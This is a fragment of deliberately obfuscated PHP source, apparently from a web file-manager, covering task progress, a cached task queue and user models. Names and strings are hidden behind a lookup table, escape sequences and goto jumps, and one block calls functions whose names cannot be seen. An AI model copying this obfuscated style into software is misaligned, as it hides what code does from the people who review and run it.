goto b‚¯èá½Œ; eÃ­æ¥òèº: $F’Ø‰½ö =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $F³ï‰ŠôÀÇ = Cache::get($céñãÚÈƒÜ[$F’Ø‰½ö[395]] . $F’Ø‰½ö[1609]); if (!$F³ï‰ŠôÀÇ || !file_exists($F³ï‰ŠôÀÇ)) { return $céñãÚÈƒÜ; } goto AÜ¦†ŸÌĞ¥; B¯‡ŒŸ£ŠÜ: } public function copyFileEnd($EßÔÀÃÇœ±, $B¤ãÆÁ‰, $a”Õâ„Ìš, $Cùññ‘©êñ, $däº‘é¤„, $f÷È¤­®) { goto e‚Úæ¥‡†; e‚Úæ¥‡†: $c‚Ÿ§†£¹š =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $DÙ‹Ê¥ŞÔÃ =& $this->task; $DÙ‹Ê¥ŞÔÃ[$c‚Ÿ§†£¹š[1597]] = $DÙ‹Ê¥ŞÔÃ[$c‚Ÿ§†£¹š[1596]]; goto c½Æ‰ÂÙ‡Ş; c½Æ‰ÂÙ‡Ş: $DÙ‹Ê¥ŞÔÃ[$c‚Ÿ§†£¹š[1598]] = $c‚Ÿ§†£¹š[33]; unset($DÙ‹Ê¥ŞÔÃ[$c‚Ÿ§†£¹š[1569]]); if ($däº‘é¤„ == $DÙ‹Ê¥ŞÔÃ[$c‚Ÿ§†£¹š[1594]]) { $DÙ‹Ê¥ŞÔÃ[$c‚Ÿ§†£¹š[1600]] += $DÙ‹Ê¥ŞÔÃ[$c‚Ÿ§†£¹š[1596]]; $DÙ‹Ê¥ŞÔÃ[$c‚Ÿ§†£¹š[1601]] = $DÙ‹Ê¥ŞÔÃ[$c‚Ÿ§†£¹š[1600]]; $this->update(1); } else { $this->update(); $DÙ‹Ê¥ŞÔÃ[$c‚Ÿ§†£¹š[1597]] = 0; } goto f“ä±ó£™ê; f“ä±ó£™ê: Cache::remove($DÙ‹Ê¥ŞÔÃ[$c‚Ÿ§†£¹š[395]] . $c‚Ÿ§†£¹š[1609]); self::log($c‚Ÿ§†£¹š[1612] . $B¤ãÆÁ‰ . $c‚Ÿ§†£¹š[67] . $Cùññ‘©êñ . $c‚Ÿ§†£¹š[229] . $däº‘é¤„ . $c‚Ÿ§†£¹š[1613] . $DÙ‹Ê¥ŞÔÃ[$c‚Ÿ§†£¹š[1594]]); goto AÕä»Ú÷ó¾; AÕä»Ú÷ó¾: } public function updateFileEnd($FƒëÄÛ¯µõ, $Dô‹Æùâèˆ) { goto B·×ö²ùºµ; e§œä™·‰ù: $this->update(1); self::log($fùšŞñÕ‰[1614] . $FƒëÄÛ¯µõ); goto aİöî³„£; B·×ö²ùºµ: $fùšŞñÕ‰ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $fŠèõã³á‘ =& $this->task; $fŠèõã³á‘[$fùšŞñÕ‰[1594]] = $FƒëÄÛ¯µõ; goto BùÆ×øíµ; BùÆ×øíµ: $fŠèõã³á‘[$fùšŞñÕ‰[1596]] = $Dô‹Æùâèˆ; $fŠèõã³á‘[$fùšŞñÕ‰[1600]] += $Dô‹Æùâèˆ; $fŠèõã³á‘[$fùšŞñÕ‰[1601]] = $fŠèõã³á‘[$fùšŞñÕ‰[1600]]; goto e§œä™·‰ù; aİöî³„£: } public function sourceModelCopy($C‰ËÇ¶„Ü) { goto C©Ò‰‚š—Ï; C©Ò‰‚š—Ï: $bÊöš„Áã =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $CÁ›¾æ·„ø = $C‰ËÇ¶„Ü[0]; $CŠÕÃ‡’¡ = $C‰ËÇ¶„Ü[1]; goto Aò¢Ì´¹·ù; E‡øáŞ„œç: switch ($CÁ›¾æ·„ø) { case $bÊöš„Áã[560]: $c”ãÍæ™…Ã = 1; break; case $bÊöš„Áã[563]: $B­ §ÚºàÖ[$bÊöš„Áã[1594]] = $CŠÕÃ‡’¡[$bÊöš„Áã[28]]; break; case $bÊöš„Áã[565]: $c”ãÍæ™…Ã = intval($C‰ËÇ¶„Ü[$bÊöš„Áã[378]] * 0.4); break; case $bÊöš„Áã[567]: $c”ãÍæ™…Ã = intval($C‰ËÇ¶„Ü[$bÊöš„Áã[378]] * 0.2); break; case $bÊöš„Áã[569]: $c”ãÍæ™…Ã = intval($C‰ËÇ¶„Ü[$bÊöš„Áã[378]] * 0.4); break; } $this->update($c”ãÍæ™…Ã); $this->sourceModelCopyFlag = !1; goto D–ÄÍ•§ÇÂ; Aò¢Ì´¹·ù: $B­ §ÚºàÖ =& $this->task; $this->sourceModelCopyFlag = !0; $c”ãÍæ™…Ã = 0; goto E‡øáŞ„œç; D–ÄÍ•§ÇÂ: } public function sourceRemove($C¬À¹”ôâ, $f»…§³ê¨¤) { $a“Êò°êÆ‹ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->sourceModelCopyFlag = !0; $còøÆÔª­§ = 1; if (isset($C¬À¹”ôâ[$a“Êò°êÆ‹[81]])) { $còøÆÔª­§ = $C¬À¹”ôâ[$a“Êò°êÆ‹[81]][$a“Êò°êÆ‹[79]] + $C¬À¹”ôâ[$a“Êò°êÆ‹[81]][$a“Êò°êÆ‹[80]] + 1; } $this->update($còøÆÔª­§); $this->sourceModelCopyFlag = !1; } public function sourceMove($D¯ÂÙŒù¢) { $this->sourceRemove($D¯ÂÙŒù¢, !1); } public function curlProgress($Fèğ¿¦Ôõ, $d¬ŞÙâ¶°ö, $AòšøÚ†ø, $Bï÷£„ºğ, $C›éæÛÃ™‰) { $e¬›’‹ƒ„ï =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $aÑ—”Ô¹ =& $this->task; if ($C›éæÛÃ™‰ > 0) { $aÑ—”Ô¹[$e¬›’‹ƒ„ï[1045]] = $e¬›’‹ƒ„ï[1615]; $aÑ—”Ô¹[$e¬›’‹ƒ„ï[1598]] = $e¬›’‹ƒ„ï[107]; if ($aÑ—”Ô¹[$e¬›’‹ƒ„ï[1596]]) { $aÑ—”Ô¹[$e¬›’‹ƒ„ï[1597]] = $C›éæÛÃ™‰; } if ($aÑ—”Ô¹[$e¬›’‹ƒ„ï[1599]]) { $aÑ—”Ô¹[$e¬›’‹ƒ„ï[1597]] = $C›éæÛÃ™‰ + $aÑ—”Ô¹[$e¬›’‹ƒ„ï[1599]]; } } else { if ($AòšøÚ†ø > 0) { if ($aÑ—”Ô¹[$e¬›’‹ƒ„ï[1596]] == $d¬ŞÙâ¶°ö) { $aÑ—”Ô¹[$e¬›’‹ƒ„ï[1597]] = $AòšøÚ†ø; $aÑ—”Ô¹[$e¬›’‹ƒ„ï[1045]] = $e¬›’‹ƒ„ï[1616]; $aÑ—”Ô¹[$e¬›’‹ƒ„ï[1598]] = $e¬›’‹ƒ„ï[1115]; } } } $this->update(); } public function curlProgressStart($Cä§¶‘“¶) { } public function curlProgressEnd($a ƒ÷ö­’) { goto c³Èá—ïÅ±; cóà¸ã­»: $this->update(); goto A’÷ÊİÉ™£; c³Èá—ïÅ±: $dÙä‡³àíå =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $BêÈ—¥ÔŞ =& $this->task; $EÒÇ£¨éĞÁ = curl_getinfo($a ƒ÷ö­’); goto dÈŠµÎ¯Ş»; dÈŠµÎ¯Ş»: $D„óğ¿¢…ª = $EÒÇ£¨éĞÁ[$dÙä‡³àíå[1617]]; if ($D„óğ¿¢…ª == -1) { $D„óğ¿¢…ª = $EÒÇ£¨éĞÁ[$dÙä‡³àíå[1618]]; } if ($BêÈ—¥ÔŞ[$dÙä‡³àíå[1598]] == $dÙä‡³àíå[107] && $D„óğ¿¢…ª) { $BêÈ—¥ÔŞ[$dÙä‡³àíå[1599]] += $D„óğ¿¢…ª; } goto cóà¸ã­»; A’÷ÊİÉ™£: } } class TaskHttp extends Task { protected function startAfter() { $eøŒ÷¬ö‚˜ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $c±ï“÷Ôˆ =& $this->task; $c±ï“÷Ôˆ[$eøŒ÷¬ö‚˜[1619]] = 1; Hook::bind($eøŒ÷¬ö‚˜[1588], array($this, $eøŒ÷¬ö‚˜[1620])); Hook::bind($eøŒ÷¬ö‚˜[1590], array($this, $eøŒ÷¬ö‚˜[1621])); Hook::bind($eøŒ÷¬ö‚˜[1592], array($this, $eøŒ÷¬ö‚˜[1622])); } protected function endAfter() { $bğÙØ²Å´ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; Hook::unbind($bğÙØ²Å´[1588], array($this, $bğÙØ²Å´[1620])); Hook::unbind($bğÙØ²Å´[1590], array($this, $bğÙØ²Å´[1621])); Hook::unbind($bğÙØ²Å´[1592], array($this, $bğÙØ²Å´[1622])); } public function progressStart($d‹‡®—í¼ğ) { $Fãœ•Àİ÷ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $c¯¬à‰‡ = curl_getinfo($d‹‡®—í¼ğ); self::log($Fãœ•Àİ÷[1623] . $c¯¬à‰‡[$Fãœ•Àİ÷[305]]); self::valueSet($this->task[$Fãœ•Àİ÷[395]], $this->task); } public function progressEnd($C¡ÖÓÒ±¨Ø) { $Dù‘Ò¹øë =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; self::log($Dù‘Ò¹øë[1624] . $this->task[$Dù‘Ò¹øë[395]]); $this->end(); } public function progress($cÙ°‰Ãë¦´, $F·´Ï¤øŠ®, $F»’äçŸ¯—, $A·¦áİÓöŠ, $cª‚çÓ½”î) { $EÌ³É„¯‡å =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $b‚Ù´´»Î¦ =& $this->task; if ($cª‚çÓ½”î > 0) { $b‚Ù´´»Î¦[$EÌ³É„¯‡å[1043]] = $b‚Ù´´»Î¦[$EÌ³É„¯‡å[1043]] == 0 ? $A·¦áİÓöŠ : $b‚Ù´´»Î¦[$EÌ³É„¯‡å[1043]]; $b‚Ù´´»Î¦[$EÌ³É„¯‡å[1057]] = $cª‚çÓ½”î; } else { if ($F»’äçŸ¯— > 0) { $b‚Ù´´»Î¦[$EÌ³É„¯‡å[1043]] = $b‚Ù´´»Î¦[$EÌ³É„¯‡å[1043]] == 0 ? $F·´Ï¤øŠ® : $b‚Ù´´»Î¦[$EÌ³É„¯‡å[1043]]; $b‚Ù´´»Î¦[$EÌ³É„¯‡å[1057]] = $F»’äçŸ¯—; } } $this->update(); self::log("\160\x72\x6f\147\162\145\x73\x73\110\x74\164\x70\x3a\x64\x6f\x77\156\x3a{$F»’äçŸ¯—}\x2f{$F·´Ï¤øŠ®}\73\40\x75\x70\x6c\157\141\144\72{$cª‚çÓ½”î}\57{$A·¦áİÓöŠ}\x3b"); } } class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\x74\141\163\153\x51\x75\x65\x75\x65\x4c\145\156\x67\x74\x68"; const QUEUE_DATA = "\x74\x61\x73\x6b\x51\165\145\x75\145\104\x61\x74\x61"; public static $listData = false; public static function initTask() { } public static function add($fÈöÔßë˜, $e‘¾¦³îÚª = array(), $AâÎ¸‡ùŸğ = '', $FÑ“Œ‡î‹Í = '') { $eäˆÆ »éÜ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($FÑ“Œ‡î‹Í && array_find_by_field(self::$listData, $eäˆÆ »éÜ[93], $FÑ“Œ‡î‹Í)) { return !0; } self::$listData[] = array($eäˆÆ »éÜ[262] => $fÈöÔßë˜, $eäˆÆ »éÜ[1625] => $e‘¾¦³îÚª, $eäˆÆ »éÜ[445] => $AâÎ¸‡ùŸğ, $eäˆÆ »éÜ[93] => $FÑ“Œ‡î‹Í); return !0; } public static function addSubmit() { $a…ô±Í­ç™ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($a…ô±Í­ç™[1626] . json_encode_force(array_to_keyvalue(self::$listData, $a…ô±Í­ç™[33], $a…ô±Í­ç™[445])), $a…ô±Í­ç™[1627]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($C¥‘ñØŠ„Õ, $e¶¹™³ƒ† = array(), $AÔÉ‡ˆó…í = '', $CĞ¿¡—çßÖ = '') { goto F‡ò™‹”Õ¨; A„ÊèÂè³¯: if ($CĞ¿¡—çßÖ && array_find_by_field($d³ÃÍ‘ôå, $A”ÕÃ²ÂŞ[93], $CĞ¿¡—çßÖ)) { return !0; } $d³ÃÍ‘ôå[] = array($A”ÕÃ²ÂŞ[262] => $C¥‘ñØŠ„Õ, $A”ÕÃ²ÂŞ[1625] => $e¶¹™³ƒ†, $A”ÕÃ²ÂŞ[445] => $AÔÉ‡ˆó…í, $A”ÕÃ²ÂŞ[93] => $CĞ¿¡—çßÖ); write_log($A”ÕÃ²ÂŞ[1626] . $AÔÉ‡ˆó…í, $A”ÕÃ²ÂŞ[1627]); goto a»ÍÌ‰É„; a»ÍÌ‰É„: self::setAll($d³ÃÍ‘ôå); return !0; goto d»š†ä˜ÆÎ; F‡ò™‹”Õ¨: $A”ÕÃ²ÂŞ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (self::count() >= self::MAX_LENGTH) { return !1; } $d³ÃÍ‘ôå = self::getAll(); goto A„ÊèÂè³¯; d»š†ä˜ÆÎ: } public static function run() { goto A£ÑÀ—Ÿ‘‹; A£ÑÀ—Ÿ‘‹: $c¸Ç£Ë’ô´ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $D–ô›Ã½Ì¬ = self::getAll(); $cç¾Š¦ÜÄõ = array_shift($D–ô›Ã½Ì¬); goto cääŠ¨ìœ¢; cääŠ¨ìœ¢: if (!$cç¾Š¦ÜÄõ) { return !1; } self::setAll($D–ô›Ã½Ì¬); $c†…ùè = timeFloat(); goto AÉ¶ùíø„; Eî½‚£Ù «: return !0; goto c¾ôøİ›‘; AÉ¶ùíø„: try { Hook::apply($cç¾Š¦ÜÄõ[$c¸Ç£Ë’ô´[262]], $cç¾Š¦ÜÄõ[$c¸Ç£Ë’ô´[1625]]); } catch (Exception $dˆ†Ğ¥Ñô) { } $bÓì¯ø“ãì = number_format(timeFloat() - $c†…ùè, 3) . $c¸Ç£Ë’ô´[1563]; write_log($c¸Ç£Ë’ô´[1628] . $cç¾Š¦ÜÄõ[$c¸Ç£Ë’ô´[445]] . $c¸Ç£Ë’ô´[1629] . $bÓì¯ø“ãì, $c¸Ç£Ë’ô´[1627]); goto Eî½‚£Ù «; c¾ôøİ›‘: } public static function count() { $B™ÔÈÆäº = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$B™ÔÈÆäº) { return 0; } return intval($B™ÔÈÆäº); } public static function getAll() { $bÌÀ±†“Ç = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$bÌÀ±†“Ç) { return array(); } return $bÌÀ±†“Ç; } public static function setAll($dÎ®ã¯•Ó) { $b‰ÇÁ‘§šò = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($dÎ®ã¯•Ó), $b‰ÇÁ‘§šò); Cache::set(self::QUEUE_DATA, $dÎ®ã¯•Ó, $b‰ÇÁ‘§šò); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } goto dÑ´ŞÕá•; a£¸ê•âĞ”: if ($_SERVER[$_SERVER[Ôğ—¤Šµˆ˜ñ£][849]] != $_SERVER[$_SERVER[Ôğ—¤Šµˆ˜ñ£][1480]]) { goto E¨Å§‹§ï; bĞ‹¢½£²ó: $f™á‘³¤¿µ = explode($_SERVER[Ôğ—¤Šµˆ˜ñ£][229], $D¢¯˜”ˆ“¾); if (count($f™á‘³¤¿µ) < $_SERVER[Ôğ—¤Šµˆ˜ñ£][609]) { $c—Á‘ö‰‘Ç = $_SERVER[Ôğ—¤Šµˆ˜ñ£][853]; $c—Á‘ö‰‘Ç(); } $E™„‡ğ´É = $_SERVER[Ôğ—¤Šµˆ˜ñ£][854]; goto E¡ñ˜ÎÕŸ÷; E¡ñ˜ÎÕŸ÷: $E™„‡ğ´É($_SERVER[$_SERVER[Ôğ—¤Šµˆ˜ñ£][847]]); goto B÷‚…œ‰ã‡; E¨Å§‹§ï: $B‡÷äŠÂœ = $_SERVER[Ôğ—¤Šµˆ˜ñ£][850]; $eóÚ•é¾´Ù = $_SERVER[$_SERVER[Ôğ—¤Šµˆ˜ñ£][851]] . $_SERVER[Ôğ—¤Šµˆ˜ñ£][852]; $D¢¯˜”ˆ“¾ = $B‡÷äŠÂœ($eóÚ•é¾´Ù); goto bĞ‹¢½£²ó; B÷‚…œ‰ã‡: } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\x6d\x2e\x6a\x6f\x62\x4c\151\163\x74"; public $field = array("\x6e\x61\x6d\x65", "\x64\145\163\x63", "\163\157\x72\x74"); const JOB_KEY = "\163\145\x6c\146\112\157\142\114\x69\163\164"; public function listData($C“«Üƒ‰· = false, $C¥ª„‰çø = "\x73\157\162\164", $E×ßİœÉ™š = false) { return parent::listData($C“«Üƒ‰·, $C¥ª„‰çø, $E×ßİœÉ™š); } public function remove($Fš×‡×ÍËä) { return parent::remove($Fš×‡×ÍËä); } public function add($CÓçŸÎÛËÒ) { $Eöƒ‚ƒ —¤ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($this->findByName($CÓçŸÎÛËÒ[$Eöƒ‚ƒ —¤[28]])) { return !1; } $CÓçŸÎÛËÒ[$Eöƒ‚ƒ —¤[1742]] = $this->getSort(); return parent::insert($CÓçŸÎÛËÒ); } private function getSort() { $fè‡¸¨Ë¸ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $bÍÉœè…½ = parent::listData(); $e£¨í×Ãó = array_to_keyvalue($bÍÉœè…½, $fè‡¸¨Ë¸[33], $fè‡¸¨Ë¸[1742]); return empty($e£¨í×Ãó) ? 0 : max($e£¨í×Ãó) + 1; } public function update($FèÆíÊÍÙ, $fòºªÑ˜¿ù) { $DÚíª‡Šë¡ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $eÌŒ ç‡° = parent::listData($FèÆíÊÍÙ); $CÌ¶«ã’« = $this->findByName($fòºªÑ˜¿ù[$DÚíª‡Šë¡[28]]); if (!$eÌŒ ç‡° || $CÌ¶«ã’« && $CÌ¶«ã’«[$DÚíª‡Šë¡[395]] != $eÌŒ ç‡°[$DÚíª‡Šë¡[395]]) { return !1; } return parent::update($FèÆíÊÍÙ, $fòºªÑ˜¿ù); } public function setUserJob($E˜‚·ôº“ô, $bµ¼è¯®) { goto dÛËÖëÔÜã; câîáô«šğ: $e¢ÅƒµìÄ = rtrim($e¢ÅƒµìÄ, $FĞÅ‡Ú¶³¢[47]); Model($FĞÅ‡Ú¶³¢[532])->metaSet($E˜‚·ôº“ô, self::JOB_KEY, $e¢ÅƒµìÄ); goto aæ‚â÷—’‚; dÛËÖëÔÜã: $FĞÅ‡Ú¶³¢ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!is_array($bµ¼è¯®)) { $bµ¼è¯® = array($bµ¼è¯®); } $Cƒ±°ƒöğŞ = parent::listData(); goto cÄÛÆ†ÂŞ; cÄÛÆ†ÂŞ: $dÏøÓšÖè† = array_to_keyvalue($Cƒ±°ƒöğŞ, $FĞÅ‡Ú¶³¢[28]); $e¢ÅƒµìÄ = $FĞÅ‡Ú¶³¢[376]; foreach ($bµ¼è¯® as $aŠØµÙ©Ì™) { if ($dÏøÓšÖè†[$aŠØµÙ©Ì™]) { $e¢ÅƒµìÄ .= $dÏøÓšÖè†[$aŠØµÙ©Ì™][$FĞÅ‡Ú¶³¢[395]] . $FĞÅ‡Ú¶³¢[47]; } else { $cÜâ‚ãè = $this->add($aŠØµÙ©Ì™); $e¢ÅƒµìÄ .= $cÜâ‚ãè . $FĞÅ‡Ú¶³¢[47]; } } goto câîáô«šğ; aæ‚â÷—’‚: } public function getUserJob($dõ£ãË®Ê) { $C±ÉŒéß“ö = Model($_SERVER[Ôğ—¤Šµˆ˜ñ£][532])->metaGet($dõ£ãË®Ê); return $this->getUserJobInfo($C±ÉŒéß“ö[self::JOB_KEY]); } public function getUserJobInfo($eäĞâìóó) { goto CÆ®³ˆƒÎ‹; c‹ğ”˜: return $f‡äŒ‘³´š; goto aæÉ’¦£ƒ; AÌÛâ¸Á­: $DšŒÎõ„¦‡ = array_remove_key($DšŒÎõ„¦‡, $eÎÉ±ƒÕ´×[194]); $f‡äŒ‘³´š = array(); foreach ($CÍÂÕ²ôÙÙ as $c…®’ó‚¶”) { if (isset($DšŒÎõ„¦‡[$c…®’ó‚¶”])) { $f‡äŒ‘³´š[] = $DšŒÎõ„¦‡[$c…®’ó‚¶”]; } } goto c‹ğ”˜; CÆ®³ˆƒÎ‹: $eÎÉ±ƒÕ´× =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $CÍÂÕ²ôÙÙ = explode($eÎÉ±ƒÕ´×[47], $eäĞâìóó); $DšŒÎõ„¦‡ = parent::listData(); goto AÌÛâ¸Á­; aæÉ’¦£ƒ: } } class UserModel extends ModelBase { protected $tableName = "\165\163\x65\x72"; protected $tableMeta = array("\x74\x61\x62\154\x65\x4e\x61\x6d\145" => "\165\163\145\x72\137\155\x65\164\141", "\x6d\145\164\141\x46\x69\x65\x6c\x64" => "\x75\163\145\162\x49\x44"); protected $simpleField = "\165\x73\145\162\x49\x44\x2c\x6e\151\x63\x6b\x4e\x61\155\145\x2c\156\x61\x6d\x65\x2c\x61\x76\141\x74\x61\x72\54\x73\145\170\54\163\x74\x61\x74\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($fá³šà›·‰) { $D¢Õ‰ÎĞÒ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $AÖÇèäĞÓ = $D¢Õ‰ÎĞÒ[2144]; return array($D¢Õ‰ÎĞÒ[1793] => array($fá³šà›·‰[0], $AÖÇèäĞÓ), $D¢Õ‰ÎĞÒ[1795] => array($fá³šà›·‰[0], $AÖÇèäĞÓ), $D¢Õ‰ÎĞÒ[2145] => array($fá³šà›·‰[0], $AÖÇèäĞÓ)); } protected function getInfo($F¥ˆñãìÈ, $D¨÷×¯Ÿ‹© = false) { $bÉ›¹áŠ’ƒ = $this->getInfoSimple($F¥ˆñãìÈ); if (!is_array($bÉ›¹áŠ’ƒ)) { return array(); } if ($D¨÷×¯Ÿ‹©) { return $this->_getInfoApply($bÉ›¹áŠ’ƒ); } return $this->cacheFunctionGet($_SERVER[Ôğ—¤Šµˆ˜ñ£][1797], $F¥ˆñãìÈ); } protected function getInfoFull($a„ÚÇšæç, $cõÀÂÈöë« = false) { $b†²÷Ø†— = $this->getInfoSimple($a„ÚÇšæç); if (!is_array($b†²÷Ø†—)) { return array(); } if ($cõÀÂÈöë«) { return $this->_getInfoApply($b†²÷Ø†—, !0); } return $this->cacheFunctionGet($_SERVER[Ôğ—¤Šµˆ˜ñ£][2146], $a„ÚÇšæç); } private function _getInfoApply($cÓ© ¤İÑŠ, $fÄÄâòÛ = false) { goto c¬òµ¼å; c¬òµ¼å: $F¿ÉŸ…¤Ï· =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$cÓ© ¤İÑŠ) { return $cÓ© ¤İÑŠ; } $B¶†À†ÛŞ” = md5($F¿ÉŸ…¤Ï·[2147] . $cÓ© ¤İÑŠ[$F¿ÉŸ…¤Ï·[872]] . $F¿ÉŸ…¤Ï·[2148] . $cÓ© ¤İÑŠ[$F¿ÉŸ…¤Ï·[28]]); goto AæÑŸ™ôÔÁ; AæÑŸ™ôÔÁ: $cÓ© ¤İÑŠ = $this->_listDataApplyItem($cÓ© ¤İÑŠ); $eÀ—ëĞÂ = Model($F¿ÉŸ…¤Ï·[1227])->metaGet($cÓ© ¤İÑŠ[$F¿ÉŸ…¤Ï·[85]][$F¿ÉŸ…¤Ï·[397]]); $cÓ© ¤İÑŠ[$F¿ÉŸ…¤Ï·[2149]] = $B¶†À†ÛŞ”; goto C’ö±—™Ä¶; C’ö±—™Ä¶: $cÓ© ¤İÑŠ[$F¿ÉŸ…¤Ï·[85]][$F¿ÉŸ…¤Ï·[1980]] = isset($eÀ—ëĞÂ[$F¿ÉŸ…¤Ï·[1981]]) ? $eÀ—ëĞÂ[$F¿ÉŸ…¤Ï·[1981]] : null; if ($fÄÄâòÛ) { $cÓ© ¤İÑŠ[$F¿ÉŸ…¤Ï·[459]] = $this->metaGet($cÓ© ¤İÑŠ[$F¿ÉŸ…¤Ï·[1550]]); } return $cÓ© ¤İÑŠ; goto C¦ç¹×á½—; C¦ç¹×á½—: } protected function getInfoSimple($f±İÄºÁøë, $eÆàÔï› = false) { $E±Ö‘àñŠƒ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$f±İÄºÁøë) { return array(); } if ($eÆàÔï›) { $A²å¦îæ”¸ = $this->where(array($E±Ö‘àñŠƒ[1550] => intval($f±İÄºÁøë)))->find(); if (!is_array($A²å¦îæ”¸)) { return array(); } $A²å¦îæ”¸[$E±Ö‘àñŠƒ[2150]] = Action($E±Ö‘àñŠƒ[2151])->parseUrl($A²å¦îæ”¸[$E±Ö‘àñŠƒ[2150]]); return $A²å¦îæ”¸; } return $this->cacheFunctionGet($E±Ö‘àñŠƒ[1798], $f±İÄºÁøë); } protected function getInfoSimpleOuter($f´í°‚ˆä·) { goto CÀ­´©ğ¨”; F¸¹³™Ü°Ã: $EÌŸ‹ˆ¯‚¸ = array_field_key($dí¯ƒÇ¥­˜, explode($Cœ™ëôˆ™–[47], $this->simpleField)); if (!$EÌŸ‹ˆ¯‚¸) { return array($Cœ™ëôˆ™–[1550] => $Cœ™ëôˆ™–[1106], $Cœ™ëôˆ™–[28] => $Cœ™ëôˆ™–[160] . LNG($Cœ™ëôˆ™–[2154]) . $Cœ™ëôˆ™–[530], $Cœ™ëôˆ™–[2150] => STATIC_PATH . $Cœ™ëôˆ™–[2155]); } $EÌŸ‹ˆ¯‚¸[$Cœ™ëôˆ™–[2150]] = Action($Cœ™ëôˆ™–[2151])->parseUrl($EÌŸ‹ˆ¯‚¸[$Cœ™ëôˆ™–[2150]]); goto Eó‰–ß°Ø; Eó‰–ß°Ø: return $EÌŸ‹ˆ¯‚¸; goto A‰Öá„éé—; CÀ­´©ğ¨”: $Cœ™ëôˆ™– =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$f´í°‚ˆä· || $f´í°‚ˆä· == 0) { return array($Cœ™ëôˆ™–[1550] => $Cœ™ëôˆ™–[191], $Cœ™ëôˆ™–[28] => $Cœ™ëôˆ™–[160] . LNG($Cœ™ëôˆ™–[2152]) . $Cœ™ëôˆ™–[530], $Cœ™ëôˆ™–[2150] => STATIC_PATH . $Cœ™ëôˆ™–[2153]); } $dí¯ƒÇ¥­˜ = $this->cacheFunctionGet($Cœ™ëôˆ™–[1798], $f´í°‚ˆä·); goto F¸¹³™Ü°Ã; A‰Öá„éé—: } protected function groupUser($e‡ºˆ¤¿´) { } public static function errorLang($bÉ¶«†­¾) { $BˆÕáô•‘† =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $c³“®À¬´Ÿ = array(self::ERROR_USER_NOT_EXISTS => $BˆÕáô•‘†[2156], self::ERROR_USER_PASSWORD_ERROR => $BˆÕáô•‘†[2157], self::ERROR_USER_EXIST_NAME => $BˆÕáô•‘†[2158], self::ERROR_USER_EXIST_PHONE => $BˆÕáô•‘†[2159], self::ERROR_USER_EXIST_EMAIL => $BˆÕáô•‘†[2160], self::ERROR_USER_LOGIN_LOCK => $BˆÕáô•‘†[2161], self::ERROR_IP_NOT_ALLOW => $BˆÕáô•‘†[2162], self::ERROR_USER_EXIST_NICKNAME => $BˆÕáô•‘†[2163]); return LNG($c³“®À¬´Ÿ[$bÉ¶«†­¾]); } public function getInfoByMeta($dö²„¨Ñã, $e¢‰ÇÓ¼) { $d“Îí ù÷Á =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $aÔ‹’ë‘ä = Model($d“Îí ù÷Á[2164])->where(array($d“Îí ù÷Á[93] => $dö²„¨Ñã, $d“Îí ù÷Á[372] => $e¢‰ÇÓ¼))->find(); if ($aÔ‹’ë‘ä) { return $this->getInfo($aÔ‹’ë‘ä[$d“Îí ù÷Á[1550]]); } return !1; } public function userLoginCheck($d“»ÓËä«™, $F†ïÓÕ°›) { $a‹Ü‚—¥ëÛ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $CÉºœºˆõ˜ = $this->userLoginFind($d“»ÓËä«™); if (!$CÉºœºˆõ˜) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($CÉºœºˆõ˜[$a‹Ü‚—¥ëÛ[1550]], $F†ïÓÕ°›)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($CÉºœºˆõ˜[$a‹Ü‚—¥ëÛ[1550]]); } public function userLoginFind($B…•™Ü¢Å) { $B½ÌÕ²Ãİà =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $eŸ³íğ‘è© = array($B½ÌÕ²Ãİà[28] => $B…•™Ü¢Å, $B½ÌÕ²Ãİà[1984] => $B…•™Ü¢Å, $B½ÌÕ²Ãİà[303] => $B…•™Ü¢Å, 